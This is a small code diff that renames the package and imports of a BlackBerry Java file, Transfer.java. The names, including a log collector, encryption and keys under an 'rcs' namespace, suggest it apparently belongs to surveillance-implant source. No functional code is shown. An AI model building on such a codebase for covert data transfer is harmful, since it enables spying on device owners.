@@ -5,7 +5,7 @@
  * File         : Transfer.java 
  * Created      : 26-mar-2010
  * *************************************************/
-package com.ht.rcs.blackberry.transfer;
+package blackberry.transfer;
 
 import java.io.IOException;
 import java.util.Random;
@@ -16,17 +16,17 @@ import net.rim.device.api.system.CodeModuleManager;
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 
-import com.ht.rcs.blackberry.Conf;
-import com.ht.rcs.blackberry.Device;
-import com.ht.rcs.blackberry.config.Keys;
-import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.fs.AutoFlashFile;
-import com.ht.rcs.blackberry.fs.Path;
-import com.ht.rcs.blackberry.log.LogCollector;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.Utils;
+import blackberry.Conf;
+import blackberry.Device;
+import blackberry.config.Keys;
+import blackberry.crypto.Encryption;
+import blackberry.fs.AutoFlashFile;
+import blackberry.fs.Path;
+import blackberry.log.LogCollector;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+import blackberry.utils.Utils;
 
 // TODO: Auto-generated Javadoc
 /**
